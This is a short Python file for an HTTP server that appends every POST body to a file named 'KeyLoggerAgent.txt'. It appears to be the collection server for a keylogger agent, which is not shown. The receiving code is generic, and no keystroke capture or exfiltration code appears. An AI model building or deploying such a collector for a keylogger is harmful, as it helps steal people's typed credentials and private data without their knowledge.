import http.server
import socketserver
import json

PORT = 8000
DATA_FILENAME = "KeyLoggerAgent.txt"

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        try:
            data_to_save = post_data
            try:
                json_data = json.loads(post_data)
                data_to_save = json.dumps(json_data, indent=4)
            except json.JSONDecodeError:
                pass

            with open(DATA_FILENAME, "a") as f:
                f.write(data_to_save + "\n---\n")
            print(f"Data successfully saved to {DATA_FILENAME}")

            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Data received and saved successfully!")

        except Exception as e:
            self.send_response(500)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(f"Error: {e}".encode('utf-8'))

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body><h1>Python Server Running</h1><p>Send a POST request to save data.</p></body></html>")
        else:
            super().do_GET()

with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print(f"Serving at port {PORT}")
    print(f"Data will be saved to '{DATA_FILENAME}' in the current directory.")
    print("Press Ctrl+C to stop the server.")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:print("\nServer stopped.")